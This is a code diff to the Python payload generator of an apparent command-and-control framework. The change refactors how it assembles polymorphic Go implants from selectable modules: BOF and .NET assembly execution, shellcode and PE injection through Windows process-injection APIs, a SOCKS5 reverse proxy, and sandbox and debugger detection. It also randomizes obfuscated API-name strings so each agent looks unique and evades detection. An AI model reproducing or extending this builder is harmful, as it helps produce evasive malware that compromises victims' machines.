@@ -77,7 +77,7 @@ class PayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False):
+    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
         print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")
 
         listener = self.db.get_listener(listener_id)
@@ -166,7 +166,7 @@ class PayloadGenerator:
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers
+                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
@@ -436,7 +436,7 @@ class PayloadGenerator:
         return agent_template.strip()
 
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
         if failover_urls is None:
             failover_urls = []
         if profile_headers is None:
@@ -508,36 +508,41 @@ class PayloadGenerator:
         agent_handle_download_func = poly.generate_random_name('handleDownload')
         agent_handle_tty_shell_func = poly.generate_random_name('handleTTYShell')
         agent_handle_sleep_func = poly.generate_random_name('handleSleep')
-        agent_handle_bof_func = poly.generate_random_name('handleBOF')
-        agent_handle_dotnet_assembly_func = poly.generate_random_name('handleDotNetAssembly')
+
+        # Conditionally generate function names based on included features
+        agent_handle_bof_func = poly.generate_random_name('handleBOF') if include_bof else 'handleBOF_stub'
+        agent_handle_dotnet_assembly_func = poly.generate_random_name('handleDotNetAssembly') if include_assembly else 'handleDotNetAssembly_stub'
+        agent_get_process_id_func = poly.generate_random_name('getProcessId') if (include_shellcode or include_pe) else 'getProcessId_stub'
+        agent_inject_shellcode_func = poly.generate_random_name('injectShellcode') if include_shellcode else 'injectShellcode_stub'
+        agent_inject_pe_func = poly.generate_random_name('injectPE') if include_pe else 'injectPE_stub'
+
+        # Generate random names for reverse proxy fields (only if included)
+        agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive') if include_reverse_proxy else 'ReverseProxyActive_stub'
+        agent_reverse_proxy_stop_chan_field = poly.generate_go_field_name('ReverseProxyStopChan') if include_reverse_proxy else 'ReverseProxyStopChan_stub'
+        agent_reverse_proxy_lock_field = poly.generate_go_field_name('ReverseProxyLock') if include_reverse_proxy else 'ReverseProxyLock_stub'
+
+        # Generate random names for reverse proxy function names (only if included)
+        agent_start_reverse_proxy_func = poly.generate_random_name('startReverseProxy') if include_reverse_proxy else 'startReverseProxy_stub'
+        agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy') if include_reverse_proxy else 'stopReverseProxy_stub'
+        agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5') if include_reverse_proxy else 'handleSOCKS5_stub'
+
+        # Generate random names for sandbox functions (only if included)
+        agent_check_sandbox_func = poly.generate_random_name('checkSandbox') if include_sandbox else 'checkSandbox_stub'
+        agent_check_processes_for_sandbox_func = poly.generate_random_name('checkProcessesForSandbox') if include_sandbox else 'checkProcessesForSandbox_stub'
+        agent_check_windows_processes_for_sandbox_func = poly.generate_random_name('checkWindowsProcessesForSandbox') if include_sandbox else 'checkWindowsProcessesForSandbox_stub'
+        agent_check_network_tools_func = poly.generate_random_name('checkNetworkTools') if include_sandbox else 'checkNetworkTools_stub'
+        agent_check_debuggers_func = poly.generate_random_name('checkDebuggers') if include_sandbox else 'checkDebuggers_stub'
+        agent_check_processes_for_debuggers_func = poly.generate_random_name('checkProcessesForDebuggers') if include_sandbox else 'checkProcessesForDebuggers_stub'
+        agent_check_windows_processes_for_debuggers_func = poly.generate_random_name('checkWindowsProcessesForDebuggers') if include_sandbox else 'checkWindowsProcessesForDebuggers_stub'
+        agent_check_windows_debugger_func = poly.generate_random_name('checkWindowsDebugger') if include_sandbox else 'checkWindowsDebugger_stub'
+
         agent_process_command_func = poly.generate_random_name('processCommand')
         agent_run_func = poly.generate_random_name('run')
         agent_stop_func = poly.generate_random_name('stop')
-        agent_check_sandbox_func = poly.generate_random_name('checkSandbox')
-        agent_check_processes_for_sandbox_func = poly.generate_random_name('checkProcessesForSandbox')
-        agent_check_windows_processes_for_sandbox_func = poly.generate_random_name('checkWindowsProcessesForSandbox')
-        agent_check_network_tools_func = poly.generate_random_name('checkNetworkTools')
-        agent_check_debuggers_func = poly.generate_random_name('checkDebuggers')
-        agent_check_processes_for_debuggers_func = poly.generate_random_name('checkProcessesForDebuggers')
-        agent_check_windows_processes_for_debuggers_func = poly.generate_random_name('checkWindowsProcessesForDebuggers')
-        agent_check_windows_debugger_func = poly.generate_random_name('checkWindowsDebugger')
         agent_self_delete_func = poly.generate_random_name('selfDelete')
         agent_hide_console_func = poly.generate_random_name('hideConsole')
         agent_check_working_hours_func = poly.generate_random_name('checkWorkingHours')
         agent_check_kill_date_func = poly.generate_random_name('checkKillDate')
-        agent_get_process_id_func = poly.generate_random_name('getProcessId')
-        agent_inject_shellcode_func = poly.generate_random_name('injectShellcode')
-        agent_inject_pe_func = poly.generate_random_name('injectPE')
-
-        # Generate random names for reverse proxy fields
-        agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive')
-        agent_reverse_proxy_stop_chan_field = poly.generate_go_field_name('ReverseProxyStopChan')
-        agent_reverse_proxy_lock_field = poly.generate_go_field_name('ReverseProxyLock')
-
-        # Generate random names for reverse proxy function names
-        agent_start_reverse_proxy_func = poly.generate_random_name('startReverseProxy')
-        agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy')
-        agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5')
 
         # Generate random names for failover functions
         agent_try_failover_func = poly.generate_random_name('tryFailover')
@@ -553,22 +558,324 @@ class PayloadGenerator:
         agent_last_connection_attempt_field = poly.generate_go_field_name('LastConnectionAttempt')
         agent_in_failover_attempt_field = poly.generate_go_field_name('InFailoverAttempt')
 
-        template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
-        with open(template_path, 'r') as f:
-            go_template = f.read()
+        # Build the Go agent by combining core and selected feature modules
+        go_code_parts = []
 
-        # If obfuscation is enabled, randomize the XOR key to make each agent different
+        # Build the package declaration with conditional imports
+        core_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'core')
+
+        # Start with the package declaration
+        package_file = os.path.join(core_dir, 'package_declaration.go')
+        if os.path.exists(package_file):
+            with open(package_file, 'r') as f:
+                full_content = f.read()
+
+                # Conditionally include imports based on features
+                import_lines = []
+                import_lines.append("package main")
+                import_lines.append("")
+                import_lines.append("import (")
+
+                # Core imports (always included)
+                core_imports = [
+                    '"bytes"',
+                    '"context"',
+                    '"crypto/tls"',
+                    '"encoding/base64"',
+                    '"encoding/binary"',
+                    '"encoding/json"',
+                    '"fmt"',
+                    '"io"',
+                    '"io/ioutil"',
+                    '"math/rand"',
+                    '"net"',
+                    '"net/http"',
+                    '"net/url"',
+                    '"os"',
+                    '"os/exec"',
+                    '"runtime"',
+                    '"strconv"',
+                    '"strings"',
+                    '"sync"',
+                    '"syscall"',
+                    '"time"',
+                    '"unsafe"',
+                    '"github.com/fernet/fernet-go"'
+                ]
+
+                for imp in core_imports:
+                    import_lines.append(f"\t{imp}")
+
+                # Conditionally add feature-specific imports
+                if include_bof:
+                    import_lines.append('\t"github.com/praetorian-inc/goffloader/src/coff"')
+                    import_lines.append('\t"github.com/praetorian-inc/goffloader/src/lighthouse"')
+
+                if include_assembly:
+                    import_lines.append('\t"github.com/Ne0nd0g/go-clr"')
+
+                import_lines.append(")")
+                import_lines.append("")  # Empty line after imports
+
+                # Add the import block
+                go_code_parts.append('\n'.join(import_lines))
+
+        # Then add other core files without package declarations or imports
+        for filename in os.listdir(core_dir):
+            if filename.endswith('.go') and filename != 'package_declaration.go':
+                with open(os.path.join(core_dir, filename), 'r') as f:
+                    content = f.read()
+                    # Remove any package declaration and import blocks from other files
+                    lines = content.split('\n')
+                    filtered_lines = []
+                    in_package = False
+                    in_imports = False
+                    in_import_block = False
+                    skip_line = False
+
+                    for line in lines:
+                        stripped = line.strip()
+
+                        # Skip package declaration
+                        if stripped.startswith('package '):
+                            continue
+
+                        # Skip import statements (both single and block)
+                        if stripped.startswith('import '):
+                            if '(' in stripped:  # import block start
+                                in_import_block = True
+                                continue
+                            else:  # single import
+                                continue
+
+                        # Handle import block
+                        if in_import_block:
+                            if stripped == ')':  # end of import block
+                                in_import_block = False
+                                continue
+                            else:  # inside import block
+                                continue
+
+                        # Add the line if not in an import block
+                        filtered_lines.append(line)
+
+                    go_code_parts.append('\n'.join(filtered_lines))
+
+        # Conditionally add feature modules
+        if include_bof:
+            bof_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'bof')
+            for filename in os.listdir(bof_dir):
+                if filename.endswith('.go'):
+                    with open(os.path.join(bof_dir, filename), 'r') as f:
+                        content = f.read()
+                        # Remove any package declaration and import blocks from feature modules
+                        lines = content.split('\n')
+                        filtered_lines = []
+                        in_import_block = False
+
+                        for line in lines:
+                            stripped = line.strip()
+
+                            # Skip package declaration
+                            if stripped.startswith('package '):
+                                continue
+
+                            # Skip import statements
+                            if stripped.startswith('import '):
+                                if '(' in stripped:  # import block start
+                                    in_import_block = True
+                                continue
+
+                            # Handle import block
+                            if in_import_block:
+                                if stripped == ')':  # end of import block
+                                    in_import_block = False
+                                continue
+
+                            filtered_lines.append(line)
+
+                        go_code_parts.append('\n'.join(filtered_lines))
+
+        if include_assembly:
+            assembly_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'assembly')
+            for filename in os.listdir(assembly_dir):
+                if filename.endswith('.go'):
+                    with open(os.path.join(assembly_dir, filename), 'r') as f:
+                        content = f.read()
+                        # Remove any package declaration and import blocks from feature modules
+                        lines = content.split('\n')
+                        filtered_lines = []
+                        in_import_block = False
+
+                        for line in lines:
+                            stripped = line.strip()
+
+                            # Skip package declaration
+                            if stripped.startswith('package '):
+                                continue
+
+                            # Skip import statements
+                            if stripped.startswith('import '):
+                                if '(' in stripped:  # import block start
+                                    in_import_block = True
+                                continue
+
+                            # Handle import block
+                            if in_import_block:
+                                if stripped == ')':  # end of import block
+                                    in_import_block = False
+                                continue
+
+                            filtered_lines.append(line)
+
+                        go_code_parts.append('\n'.join(filtered_lines))
+
+        if include_shellcode or include_pe:  # Both need the same Windows structures
+            shellcode_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'shellcode')
+            for filename in os.listdir(shellcode_dir):
+                if filename.endswith('.go'):
+                    with open(os.path.join(shellcode_dir, filename), 'r') as f:
+                        content = f.read()
+                        # Remove any package declaration and import blocks from feature modules
+                        lines = content.split('\n')
+                        filtered_lines = []
+                        in_import_block = False
+
+                        for line in lines:
+                            stripped = line.strip()
+
+                            # Skip package declaration
+                            if stripped.startswith('package '):
+                                continue
+
+                            # Skip import statements
+                            if stripped.startswith('import '):
+                                if '(' in stripped:  # import block start
+                                    in_import_block = True
+                                continue
+
+                            # Handle import block
+                            if in_import_block:
+                                if stripped == ')':  # end of import block
+                                    in_import_block = False
+                                continue
+
+                            filtered_lines.append(line)
+
+                        go_code_parts.append('\n'.join(filtered_lines))
+
+        if include_pe:
+            pe_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'pe')
+            for filename in os.listdir(pe_dir):
+                if filename.endswith('.go'):
+                    with open(os.path.join(pe_dir, filename), 'r') as f:
+                        content = f.read()
+                        # Remove any package declaration and import blocks from feature modules
+                        lines = content.split('\n')
+                        filtered_lines = []
+                        in_import_block = False
+
+                        for line in lines:
+                            stripped = line.strip()
+
+                            # Skip package declaration
+                            if stripped.startswith('package '):
+                                continue
+
+                            # Skip import statements
+                            if stripped.startswith('import '):
+                                if '(' in stripped:  # import block start
+                                    in_import_block = True
+                                continue
+
+                            # Handle import block
+                            if in_import_block:
+                                if stripped == ')':  # end of import block
+                                    in_import_block = False
+                                continue
+
+                            filtered_lines.append(line)
+
+                        go_code_parts.append('\n'.join(filtered_lines))
+
+        if include_reverse_proxy:
+            reverse_proxy_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'reverse_proxy')
+            for filename in os.listdir(reverse_proxy_dir):
+                if filename.endswith('.go'):
+                    with open(os.path.join(reverse_proxy_dir, filename), 'r') as f:
+                        content = f.read()
+                        # Remove any package declaration and import blocks from feature modules
+                        lines = content.split('\n')
+                        filtered_lines = []
+                        in_import_block = False
+
+                        for line in lines:
+                            stripped = line.strip()
+
+                            # Skip package declaration
+                            if stripped.startswith('package '):
+                                continue
+
+                            # Skip import statements
+                            if stripped.startswith('import '):
+                                if '(' in stripped:  # import block start
+                                    in_import_block = True
+                                continue
+
+                            # Handle import block
+                            if in_import_block:
+                                if stripped == ')':  # end of import block
+                                    in_import_block = False
+                                continue
+
+                            filtered_lines.append(line)
+
+                        go_code_parts.append('\n'.join(filtered_lines))
+
+        if include_sandbox:
+            sandbox_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'sandbox')
+            for filename in os.listdir(sandbox_dir):
+                if filename.endswith('.go'):
+                    with open(os.path.join(sandbox_dir, filename), 'r') as f:
+                        content = f.read()
+                        # Remove any package declaration and import blocks from feature modules
+                        lines = content.split('\n')
+                        filtered_lines = []
+                        in_import_block = False
+
+                        for line in lines:
+                            stripped = line.strip()
+
+                            # Skip package declaration
+                            if stripped.startswith('package '):
+                                continue
+
+                            # Skip import statements
+                            if stripped.startswith('import '):
+                                if '(' in stripped:  # import block start
+                                    in_import_block = True
+                                continue
+
+                            # Handle import block
+                            if in_import_block:
+                                if stripped == ')':  # end of import block
+                                    in_import_block = False
+                                continue
+
+                            filtered_lines.append(line)
+
+                        go_code_parts.append('\n'.join(filtered_lines))
+
+        go_code = '\n'.join(go_code_parts)
+
+        # Apply polymorphic transformations to the combined code
         if obfuscate:
-            # Generate a random XOR key for string obfuscation
-            random_obfuscation_key = random.randint(1, 255)
-
             # Find and replace the obfuscation key in the template
-            go_template = go_template.replace('obfuscationKey = byte(0x42)', f'obfuscationKey = byte({random_obfuscation_key})')
+            go_code = go_code.replace('obfuscationKey = byte(0x42)', f'obfuscationKey = byte({random.randint(1, 255)})')
 
             # Also make the obfuscated byte arrays random to make each agent unique
             # This means each agent will have different obfuscated byte sequences
             import re
-            import binascii
 
             # Find all the obfuscated byte arrays and replace them with randomly generated ones
             # that will still decrypt to the same original strings
@@ -589,30 +896,31 @@ class PayloadGenerator:
                 replacement = f'{var_name} = []byte{{{byte_array_str}}} // "{original_string}"'
                 return re.sub(pattern, replacement, go_code_template)
 
-            # Randomize the obfuscated DLL and API names
-            go_template = randomize_obfuscated_bytes(go_template, "kernel32.dll", "obfuscatedKernel32DLL")
-            go_template = randomize_obfuscated_bytes(go_template, "ntdll.dll", "obfuscatedNtdllDLL")
-            go_template = randomize_obfuscated_bytes(go_template, "user32.dll", "obfuscatedUser32DLL")
-            go_template = randomize_obfuscated_bytes(go_template, "OpenProcess", "obfuscatedOpenProcess")
-            go_template = randomize_obfuscated_bytes(go_template, "VirtualAllocEx", "obfuscatedVirtualAllocEx")
-            go_template = randomize_obfuscated_bytes(go_template, "WriteProcessMemory", "obfuscatedWriteProcessMemory")
-            go_template = randomize_obfuscated_bytes(go_template, "CreateRemoteThread", "obfuscatedCreateRemoteThread")
-            go_template = randomize_obfuscated_bytes(go_template, "VirtualProtectEx", "obfuscatedVirtualProtectEx")
-            go_template = randomize_obfuscated_bytes(go_template, "CreateToolhelp32Snapshot", "obfuscatedCreateToolhelp32Snapshot")
-            go_template = randomize_obfuscated_bytes(go_template, "Process32FirstW", "obfuscatedProcess32First")
-            go_template = randomize_obfuscated_bytes(go_template, "Process32NextW", "obfuscatedProcess32Next")
-            go_template = randomize_obfuscated_bytes(go_template, "CreateProcessW", "obfuscatedCreateProcess")
-            go_template = randomize_obfuscated_bytes(go_template, "ResumeThread", "obfuscatedResumeThread")
-            go_template = randomize_obfuscated_bytes(go_template, "SuspendThread", "obfuscatedSuspendThread")
-            go_template = randomize_obfuscated_bytes(go_template, "GetThreadContext", "obfuscatedGetThreadContext")
-            go_template = randomize_obfuscated_bytes(go_template, "SetThreadContext", "obfuscatedSetThreadContext")
-            go_template = randomize_obfuscated_bytes(go_template, "ReadProcessMemory", "obfuscatedReadProcessMemory")
-            go_template = randomize_obfuscated_bytes(go_template, "NtUnmapViewOfSection", "obfuscatedNtUnmapViewOfSection")
-            go_template = randomize_obfuscated_bytes(go_template, "GetConsoleWindow", "obfuscatedGetConsoleWindow")
-            go_template = randomize_obfuscated_bytes(go_template, "ShowWindow", "obfuscatedShowWindow")
+            # Randomize the obfuscated DLL and API names if they exist in the code
+            if include_shellcode or include_pe:  # These features include the obfuscated strings
+                go_code = randomize_obfuscated_bytes(go_code, "kernel32.dll", "obfuscatedKernel32DLL")
+                go_code = randomize_obfuscated_bytes(go_code, "ntdll.dll", "obfuscatedNtdllDLL")
+                go_code = randomize_obfuscated_bytes(go_code, "user32.dll", "obfuscatedUser32DLL")
+                go_code = randomize_obfuscated_bytes(go_code, "OpenProcess", "obfuscatedOpenProcess")
+                go_code = randomize_obfuscated_bytes(go_code, "VirtualAllocEx", "obfuscatedVirtualAllocEx")
+                go_code = randomize_obfuscated_bytes(go_code, "WriteProcessMemory", "obfuscatedWriteProcessMemory")
+                go_code = randomize_obfuscated_bytes(go_code, "CreateRemoteThread", "obfuscatedCreateRemoteThread")
+                go_code = randomize_obfuscated_bytes(go_code, "VirtualProtectEx", "obfuscatedVirtualProtectEx")
+                go_code = randomize_obfuscated_bytes(go_code, "CreateToolhelp32Snapshot", "obfuscatedCreateToolhelp32Snapshot")
+                go_code = randomize_obfuscated_bytes(go_code, "Process32FirstW", "obfuscatedProcess32First")
+                go_code = randomize_obfuscated_bytes(go_code, "Process32NextW", "obfuscatedProcess32Next")
+                go_code = randomize_obfuscated_bytes(go_code, "CreateProcessW", "obfuscatedCreateProcess")
+                go_code = randomize_obfuscated_bytes(go_code, "ResumeThread", "obfuscatedResumeThread")
+                go_code = randomize_obfuscated_bytes(go_code, "SuspendThread", "obfuscatedSuspendThread")
+                go_code = randomize_obfuscated_bytes(go_code, "GetThreadContext", "obfuscatedGetThreadContext")
+                go_code = randomize_obfuscated_bytes(go_code, "SetThreadContext", "obfuscatedSetThreadContext")
+                go_code = randomize_obfuscated_bytes(go_code, "ReadProcessMemory", "obfuscatedReadProcessMemory")
+                go_code = randomize_obfuscated_bytes(go_code, "NtUnmapViewOfSection", "obfuscatedNtUnmapViewOfSection")
+                go_code = randomize_obfuscated_bytes(go_code, "GetConsoleWindow", "obfuscatedGetConsoleWindow")
+                go_code = randomize_obfuscated_bytes(go_code, "ShowWindow", "obfuscatedShowWindow")
 
         # Replace all placeholders with randomly generated names
-        go_code = go_template.replace('{AGENT_STRUCT_NAME}', agent_struct_name)
+        go_code = go_code.replace('{AGENT_STRUCT_NAME}', agent_struct_name)
         go_code = go_code.replace('{TASK_STRUCT_NAME}', task_struct_name)
         go_code = go_code.replace('{TASK_RESULT_STRUCT_NAME}', task_result_struct_name)
         go_code = go_code.replace('{API_RESPONSE_STRUCT_NAME}', api_response_struct_name)
@@ -797,28 +1105,33 @@ class PayloadGenerator:
             if result.returncode != 0:
                 raise Exception(f"Failed to get fernet-go dependency: {result.stderr}")
 
-            # Get goffloader dependencies for BOF execution
-            result = subprocess.run([
-                'go', 'get', 'github.com/praetorian-inc/goffloader/src/coff'
-            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
+            # Conditionally get dependencies based on included features
+            if include_bof:
+                result = subprocess.run([
+                    'go', 'get', 'github.com/praetorian-inc/goffloader/src/coff'
+                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
 
-            if result.returncode != 0:
-                raise Exception(f"Failed to get goffloader coff dependency: {result.stderr}")
+                if result.returncode != 0:
+                    raise Exception(f"Failed to get goffloader coff dependency: {result.stderr}")
 
-            result = subprocess.run([
-                'go', 'get', 'github.com/praetorian-inc/goffloader/src/lighthouse'
-            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
+                result = subprocess.run([
+                    'go', 'get', 'github.com/praetorian-inc/goffloader/src/lighthouse'
+                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
 
-            if result.returncode != 0:
-                raise Exception(f"Failed to get goffloader lighthouse dependency: {result.stderr}")
+                if result.returncode != 0:
+                    raise Exception(f"Failed to get goffloader lighthouse dependency: {result.stderr}")
 
-            # Get go-clr dependency for .NET assembly execution
-            result = subprocess.run([
-                'go', 'get', 'github.com/Ne0nd0g/go-clr'
-            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
+            # Get go-clr dependency for .NET assembly execution if included
+            if include_assembly:
+                result = subprocess.run([
+                    'go', 'get', 'github.com/Ne0nd0g/go-clr'
+                ], capture_output=True, text=True, cwd=temp_dir, env=go_env)
 
-            if result.returncode != 0:
-                raise Exception(f"Failed to get go-clr dependency: {result.stderr}")
+                if result.returncode != 0:
+                    raise Exception(f"Failed to get go-clr dependency: {result.stderr}")
+
+            # No additional dependencies needed for the enhanced shellcode injection
+            # since we're using native Windows API calls that are already available through syscall
 
             output_filename = 'agent.exe'
             temp_exe_path = os.path.join(temp_dir, 'agent.exe')
